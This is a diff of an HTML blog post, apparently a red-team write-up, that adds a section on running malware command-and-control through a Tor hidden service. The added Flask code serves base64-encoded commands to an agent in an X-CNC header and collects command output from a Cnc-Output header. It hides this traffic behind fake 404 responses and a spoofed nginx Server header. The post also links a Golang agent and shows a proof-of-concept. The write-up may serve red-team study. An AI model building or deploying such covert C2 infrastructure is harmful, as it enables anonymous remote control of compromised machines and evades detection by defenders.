@@ -41,14 +41,64 @@
 
 <h3 id="architecture">Architecture</h3>
 
-<h4 id="the-agent">The Agent</h4>
+<p>Below is the diagram of the architecture.<br />
+<img src="images/1.jpg" alt="Diagram" />
+<br /></p>
+
+<p>The C2 is served as a hidden service. The agent or “malware” would connect to it through the TOR network. HTTP method must be “PUT” to fetch C2 commands. The command is stuffed in <strong>X-CNC</strong> header in the HTTP response. HTTP method must be  “OPTIONS” to return command output. It is stuffed by agent in the <strong>Cnc-Output</strong> HTTP response header. Below can be seen the flask handling of the HTTP interaction. Commands can be set in <strong>commands.txt</strong> .</p>
 
 <h4 id="the-command-and-control-server">The Command and Control Server</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># In c2_server/app.py
+</span><span class="p">...</span>
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/s3cr3t'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'PUT'</span><span class="p">,</span> <span class="s">'OPTIONS'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">s3cr3t_cnc</span><span class="p">():</span>
+    <span class="c1"># OPTIONS = Accepting CNC result
+</span>    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s">'404.html'</span><span class="p">))</span>
+    <span class="n">resp</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="s">'Server'</span><span class="p">,</span> <span class="s">'nginx'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'OPTIONS'</span><span class="p">:</span>
+        <span class="c1"># Get CNC results
+</span>        <span class="n">foo</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">foo</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Cnc-Output'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">command_output</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">foo</span><span class="p">[</span><span class="s">'Cnc-Output'</span><span class="p">])</span>
+            <span class="n">command_output</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\n\n\n\n\n\n</span><span class="s">"</span><span class="o">+</span><span class="n">command_output</span>
+            <span class="n">write_to_file</span><span class="p">(</span><span class="n">command_output_file</span><span class="p">,</span> <span class="n">command_output</span><span class="p">,</span> <span class="n">w_type</span><span class="o">=</span><span class="s">"ab"</span><span class="p">)</span>
 
-<h3 id="summary">Summary</h3>
+        <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="mi">404</span>
 
-<p><strong>Sources:</strong></p>
+
+    <span class="c1"># PUT = Sending CNC commands
+</span>    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'PUT'</span><span class="p">:</span>
+        <span class="c1"># Set the command in the headers and in base64
+</span>        <span class="n">command</span> <span class="o">=</span> <span class="n">read_from_file</span><span class="p">(</span><span class="n">command_file</span><span class="p">,</span><span class="n">r_type</span><span class="o">=</span><span class="s">"rb"</span><span class="p">)</span>
+        <span class="n">resp</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="sa">b</span><span class="s">'X-CNC'</span><span class="p">,</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="mi">404</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="mi">404</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p><br />The totality of the code just returns 404 regardless there is a hit or not. In my setup, it is also behind an Nginx server and redirects traffic to http://127.0.0.1:8000/s3cr3t if <em>/s3cr3t</em> is hit.</p>
+
+<h4 id="the-agent">The Agent</h4>
+
+<p>Below is the agent’s activity Cycle.<br />
+<img src="images/2.jpg" alt="Diagram" />
+<br /></p>
+
+<p>The code is written in Golang and can be seen <a href="https://github.com/Altelus1/c2_tor/blob/master/agent/main.go">here</a>. In the main repository also can be seen the non tor agent to test things out in  local environment. Links can be replaced by IPs instead of onion links.</p>
+
+<h3 id="poc">PoC</h3>
+
+<p>Running C2 and the agent.<br />
+<img src="images/poc_c2tor.gif" alt="PoC" /></p>
+
+<h3 id="end-notes">End notes</h3>
+<p>Running C2 as a hidden service would come in pros and cons. Pros would be the likes of being anonymous, be able to self-hos thus having a full control, or having a dynamic generated onion hostnames. Cons would be the likes of being easy to be detected in network and in host threat hunting or having a muuuuch slower connection to a normal C2. Enhancements or workarounds can be done to remediate the cons or weaponize the pros. At the end of the day, this is just one of the techniques can be used to serve a C2.
+<br /></p>
+
+<p><strong>Resources:</strong></p>
 <ul>
+  <li>https://medium.com/@rishabhlakhotia/setting-up-tor-hidden-service-8af1875921c6</li>
+  <li>https://hackernoon.com/setting-up-a-tor-hidden-service-a-how-to-guide-zs1s3yoy</li>
   <li>https://github.com/cretz/bine</li>
   <li>https://flask.palletsprojects.com/en/2.0.x/</li>
   <li>https://pkg.go.dev/net/http</li>
